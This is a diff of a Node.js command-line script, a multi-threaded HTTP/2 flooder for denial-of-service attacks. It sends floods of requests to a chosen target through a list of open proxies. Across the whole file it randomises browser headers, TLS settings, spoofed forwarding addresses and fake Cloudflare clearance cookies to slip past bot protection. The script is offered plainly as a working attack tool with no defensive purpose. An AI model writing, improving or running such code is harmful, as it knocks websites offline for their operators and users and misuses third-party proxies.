@@ -6,261 +6,278 @@ const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 
+
 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
-process.on('uncaughtException', () => {});
+process.on('uncaughtException', function (exception) {
+ });
 
-if (process.argv.length < 7) {
-    console.log("Usage: node script.js <target> <time> <rate> <threads> <proxy_file>");
-    process.exit(1);
-}
-
-function readLines(filePath) {
-    if (!fs.existsSync(filePath)) process.exit(1);
-    const lines = fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
-    if (!lines.length) process.exit(1);
-    return lines;
+if (process.argv.length < 7){console.log(`Usage: target time rate thread proxyfile`); process.exit();}
+const headers = {};
+ function readLines(filePath) {
+    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
-function randomElement(arr) {
-    return arr[randomIntn(0, arr.length)];
+function randomElement(elements) {
+    return elements[randomIntn(0, elements.length)];
 }
 
 function randstr(length) {
-    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
-    let res = "";
-    for (let i = 0; i < length; i++) {
-        res += chars.charAt(Math.floor(Math.random() * chars.length));
-    }
-    return res;
+  const characters =
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+  let result = "";
+  const charactersLength = characters.length;
+  for (let i = 0; i < length; i++) {
+    result += characters.charAt(Math.floor(Math.random() * charactersLength));
+  }
+  return result;
 }
-
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
-    rate: parseInt(process.argv[4]),
+    Rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6]
-};
-
-const proxies = readLines(args.proxyFile);
+}
+const sig = [
+  'ecdsa_secp256r1_sha256',
+  'rsa_pkcs1_sha384',
+  'rsa_pkcs1_sha512',
+  'hmac_sha256',
+  'ecdsa_secp384r1_sha384',
+  'rsa_pkcs1_sha1',
+  'hmac_sha1'
+];
+ const accept_header = [
+    '*/*',
+    'image/*',
+    'image/webp,image/apng',
+    'text/html',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+    'application/json',
+    'application/xml',
+    'application/pdf',
+    'text/css',
+    'application/javascript'
+  ];
+const lang_header = [
+    'ko-KR',
+    'en-US',
+    'zh-CN',
+    'zh-TW',
+    'en-ZA',
+    'fr-FR',
+    'ja-JP',
+    'ar-EG',
+    'de-DE',
+    'es-ES'
+  ];
+const encoding_header = [
+    'gzip, deflate, br',
+    'deflate',
+    'gzip, deflate, lzma, sdch',
+    'deflate',
+    'identity',
+    'compress',
+    'br'
+  ];
+const version = [
+    '"Google Chrome";v="113", "Chromium";v="113", ";Not A Brand";v="99"',
+    '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
+    '"Mozilla Firefox";v="91", ";Not A Brand";v="99"',
+    '"Safari";v="14.1.2", "Chrome";v="91.0.4472.164", "Safari";v="14.1.2"',
+    '"Opera";v="79.0.4143.22", "Chrome";v="92.0.4515.115", "Opera";v="79.0.4143.22"',
+    '"Microsoft Edge";v="92.0.902.62", "Chrome";v="92.0.4515.131", "Microsoft Edge";v="92.0.902.62"'
+  ];
+const rateHeaders = [
+{ "akamai-origin-hop": randstr(12)  },
+{ "proxy-client-ip": randstr(12)  },
+{ "via": randstr(12)  },
+{ "cluster-ip": randstr(12)  },
+{ "user-agent": randstr(12) },
+];
+var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
+var ver = version[Math.floor(Math.floor(Math.random() * version.length))];
+var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
+var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
+var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
+var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);
 
-const userAgents = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Android 15; Mobile; rv:131.0) Gecko/131.0 Firefox/131.0"
-];
+if (cluster.isMaster) {
+   for (let counter = 1; counter <= args.threads; counter++) {
+       cluster.fork();
+   }
 
-const acceptHeaders = [
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-    "application/json, text/plain, */*",
-    "image/jpeg, image/png, */*"
-];
+   console.clear();
+   console.log('\x1b[1m\x1b[34m' + 'Target: ' + '\x1b[0m' + '\x1b[1m' + parsedTarget.host + '\x1b[0m');
+   console.log('\x1b[1m\x1b[33m' + 'Duration: ' + '\x1b[0m' + '\x1b[1m' + args.time + '\x1b[0m');
+   console.log('\x1b[1m\x1b[32m' + 'Threads: ' + '\x1b[0m' + '\x1b[1m' + args.threads + '\x1b[0m');
+   console.log('\x1b[1m\x1b[31m' + 'Requests per second: ' + '\x1b[0m' + '\x1b[1m' + args.Rate + '\x1b[0m');
 
-const langHeaders = [
-    "en-US,en;q=0.9",
-    "vi-VN,vi;q=0.9,en-US;q=0.8",
-    "zh-CN,zh;q=0.9,en;q=0.8",
-    "fr-FR,fr;q=0.9,en;q=0.8"
-];
 
-const encodingHeaders = ["gzip, deflate, br, zstd"];
-
-const secFetchDest = ["document", "script", "image", "font"];
-const secFetchMode = ["navigate", "cors", "no-cors", "same-origin"];
-const secFetchSite = ["same-origin", "same-site", "cross-site"];
-
-const cacheControl = ["no-cache", "max-age=0"];
-
-const referers = [
-    `https://${parsedTarget.host}/`,
-    `https://${parsedTarget.host}${parsedTarget.path}`,
-    `https://${parsedTarget.host}/search?q=${randstr(6)}`,
-    "https://www.google.com/",
-    "https://www.bing.com/",
-    ""
-];
-
-const platforms = ["Windows", "Macintosh", "Linux", "iPhone", "Android"];
-
-const secChUa = [
-    '"Google Chrome";v="129", "Chromium";v="129", "Not.A/Brand";v="99"',
-    '"Firefox";v="131"',
-    '"Safari";v="18.1"',
-    '"Microsoft Edge";v="129"'
-];
-
-const secChUaFullVersion = [
-    '"129.0.6668.100"',
-    '"131.0.0.0"',
-    '"18.1.0"',
-    '"129.0.2792.79"'
-];
-
-const ciphers = [
-    "TLS_AES_128_GCM_SHA256",
-    "TLS_AES_256_GCM_SHA384",
-    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
-    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
-    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
-    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256"
-].join(":");
+} else {setInterval(runFlooder) }
 
 class NetSocket {
-    HTTP(options) {
-        return new Promise((resolve, reject) => {
-            const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
-            const buffer = Buffer.from(payload);
-            const connection = net.connect({
-                host: options.host,
-                port: options.port,
-                noDelay: true
-            });
-            connection.setTimeout(options.timeout * 1000);
-            connection.setKeepAlive(true, 60000);
-            connection.on("connect", () => connection.write(buffer));
-            connection.on("data", chunk => {
-                const response = chunk.toString("utf-8");
-                if (!response.includes("HTTP/1.1 200")) {
-                    connection.destroy();
-                    return reject("invalid proxy response");
-                }
-                resolve(connection);
-            });
-            connection.on("timeout", () => {
-                connection.destroy();
-                reject("timeout");
-            });
-            connection.on("error", () => {
-                connection.destroy();
-                reject("error");
-            });
-        });
-    }
+    constructor(){}
+
+ HTTP(options, callback) {
+    const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
+    const buffer = new Buffer.from(payload);
+
+    const connection = net.connect({
+        host: options.host,
+        port: options.port,
+        noDelay: true,
+    });
+
+    connection.setTimeout(options.timeout * 100000);
+    connection.setKeepAlive(true, 100000);
+
+    connection.on("connect", () => {
+        connection.write(buffer);
+    });
+
+    connection.on("data", chunk => {
+        const response = chunk.toString("utf-8");
+        const isAlive = response.includes("HTTP/1.1 200");
+        if (isAlive === false) {
+            connection.destroy();
+            return callback(undefined, "error: invalid response from proxy server");
+        }
+        return callback(connection, undefined);
+    });
+
+    connection.on("timeout", () => {
+        connection.destroy();
+        return callback(undefined, "error: timeout exceeded");
+    });
+
+    connection.on("error", error => {
+        connection.destroy();
+        return callback(undefined, "error: " + error);
+    });
 }
+}
+
+
+
 
 const Socker = new NetSocket();
+headers[":method"] = "GET";
+headers[":authority"] = parsedTarget.host;
+headers[":path"] = parsedTarget.path + "?" + randstr(10) + "=" + randstr(5);
+headers[":scheme"] = "https";
+headers["sec-ch-ua"] = ver;
+headers["sec-ch-ua-platform"] = "Windows";
+headers["sec-ch-ua-mobile"] = "?0";
+headers["accept-encoding"] = encoding;
+headers["accept-language"] = lang;
+headers["upgrade-insecure-requests"] = "1";
+headers["accept"] = accept;
+headers["sec-fetch-mode"] = "navigate";
+headers["sec-fetch-dest"] = "document";
+headers["sec-fetch-site"] = "same-origin";
+headers["sec-fetch-user"] = "?1";
+headers["x-requested-with"] = "XMLHttpRequest";
 
-function generateDynamicPath() {
-    const basePath = parsedTarget.path === "/" ? "" : parsedTarget.path;
-    const queries = [
-        `q=${encodeURIComponent(randstr(6))}`,
-        `id=${randomIntn(1000, 9999)}`,
-        `page=${randomIntn(1, 20)}`,
-        `token=${randstr(10)}`,
-        `lang=${randomElement(['en', 'vi', 'zh', 'fr'])}`,
-        `category=${randstr(5)}`
-    ];
-    const queryCount = randomIntn(1, 4);
-    return `${basePath}?${queries.slice(0, queryCount).join('&')}`;
-}
 
-function generateHeaders() {
-    const uaIndex = randomIntn(0, userAgents.length);
-    return {
-        ":method": "GET",
-        ":authority": parsedTarget.host,
-        ":path": generateDynamicPath(),
-        ":scheme": "https",
-        "user-agent": userAgents[uaIndex],
-        "accept": randomElement(acceptHeaders),
-        "accept-language": randomElement(langHeaders),
-        "accept-encoding": randomElement(encodingHeaders),
-        "sec-fetch-dest": randomElement(secFetchDest),
-        "sec-fetch-mode": randomElement(secFetchMode),
-        "sec-fetch-site": randomElement(secFetchSite),
-        "sec-ch-ua": secChUa[uaIndex],
-        "sec-ch-ua-mobile": randomElement(["?0", "?1"]),
-        "sec-ch-ua-platform": platforms[uaIndex % platforms.length],
-        "sec-ch-ua-full-version-list": secChUaFullVersion[uaIndex],
-        "upgrade-insecure-requests": "1",
-        "priority": randomElement(["u=0, i", "u=1"]),
-        "cache-control": randomElement(cacheControl),
-        "referer": randomElement(referers),
-        "x-forwarded-for": `${randomIntn(1, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}`,
-        "sec-ch-prefers-color-scheme": randomElement(["light", "dark"]),
-        "sec-ch-viewport-width": randomIntn(800, 1920).toString(),
-        "cookie": `__cfduid=${randstr(32)}; cf_clearance=${randstr(40)}; session=${randstr(16)}`
-    };
-}
+function runFlooder() {
+   const proxyAddr = randomElement(proxies);
+   const parsedProxy = proxyAddr.split(":");
 
-async function runFlooder() {
-    let proxyAddr = randomElement(proxies);
-    let parsedProxy = proxyAddr.split(":");
-    try {
-        const connection = await Socker.HTTP({
-            host: parsedProxy[0],
-            port: parseInt(parsedProxy[1]),
-            address: parsedTarget.host + ":443",
-            timeout: 5
-        });
-        const tlsOptions = {
-            ALPNProtocols: ['h2'],
-            ciphers: ciphers,
-            host: parsedTarget.host,
-            servername: parsedTarget.host,
-            rejectUnauthorized: false,
-            minVersion: 'TLSv1.3',
-            maxVersion: 'TLSv1.3',
-            ecdhCurve: 'X25519',
-            sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256',
-            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION,
-            socket: connection
-        };
-        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
-        tlsConn.setKeepAlive(true, 120000);
-        const client = http2.connect(parsedTarget.href, {
-            protocol: "https:",
-            settings: {
-                maxConcurrentStreams: 1000,
-                initialWindowSize: 10 * 1024 * 1024,
-                maxHeaderListSize: 262144
-            },
-            createConnection: () => tlsConn
-        });
-        client.on("connect", () => {
-            const attackInterval = setInterval(() => {
-                const headers = generateHeaders();
-                for (let i = 0; i < args.rate; i++) {
-                    const req = client.request(headers, { endStream: true });
-                    req.on("response", () => req.close());
-                    req.on("error", () => req.close());
-                    req.end();
-                }
-            }, 10);
-            setTimeout(() => {
-                clearInterval(attackInterval);
-                client.destroy();
-                tlsConn.destroy();
-                connection.destroy();
-            }, args.time * 1000);
-        });
-        client.on("error", () => {
-            client.destroy();
-            tlsConn.destroy();
-            connection.destroy();
-        });
-        client.on("close", () => {
-            client.destroy();
-            tlsConn.destroy();
-            connection.destroy();
-        });
-    } catch {
-        setTimeout(runFlooder, 500);
+   const proxyOptions = {
+       host: parsedProxy[0],
+       port: ~~parsedProxy[1],
+       address: parsedTarget.host + ":443",
+       timeout: 2.5,
+   };
+
+   Socker.HTTP(proxyOptions, (connection, error) => {
+    if (error) {
+      connection.close();
+      connection.destroy();
+      return;
     }
-}
 
-if (cluster.isMaster) {
-    for (let i = 0; i < args.threads; i++) cluster.fork();
-    setTimeout(() => process.exit(0), args.time * 1000);
-} else {
-    setInterval(runFlooder, 0);
+const tlsOptions = (() => {
+ const useTlsOption2 = (Math.random() < 0.5);
+ return useTlsOption2 ?
+   {
+     secure: true,
+     ALPNProtocols: ['h2'],
+     sigals: siga,
+     socket: connection,
+     ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
+     ecdhCurve: 'P-256:P-384',
+     host: parsedTarget.host,
+     servername: parsedTarget.host,
+     rejectUnauthorized: false,
+   } :
+   {
+     secure: true,
+     ALPNProtocols: ['h2'],
+     ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
+     ecdhCurve: 'auto',
+     rejectUnauthorized: false,
+     servername: parsedTarget.host,
+     secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
+                    crypto.constants.SSL_OP_NO_TICKET |
+                    crypto.constants.SSL_OP_NO_COMPRESSION |
+                    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
+                    crypto.constants.SSL_OP_NO_RENEGOTIATION |
+                    crypto.constants.SSL_OP_SINGLE_DH_USE |
+                    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
+                    crypto.constants.SSL_OP_NO_QUERY_MTU,
+   };
+})();
+
+const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
+tlsConn.setKeepAlive(true, 60000);
+
+const client = http2.connect(parsedTarget.href, {
+    protocol: "https:",
+    settings: {
+        headerTableSize: 65536,
+        maxConcurrentStreams: 1000,
+        initialWindowSize: 6291456,
+        maxHeaderListSize: 65536,
+        enablePush: false
+    },
+    createConnection: () => tlsConn,
+});
+
+client.on("connect", () => {
+    const IntervalAttack = setInterval(() => {
+        const dynHeaders = {
+            ...headers,
+            ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
+        };
+        for (let i = 0; i < args.Rate; i++) {
+            const request = client.request(dynHeaders);
+
+            request.on("response", response => {
+                request.close();
+                request.destroy();
+                return;
+            });
+
+            request.end();
+        }
+    }, 150);
+});
+
+client.on("close", () => {
+    client.destroy();
+    return;
+});
+   })
+const killer = () => process.exit(1);
+
+setTimeout(killer, args.time * 1000);
 }
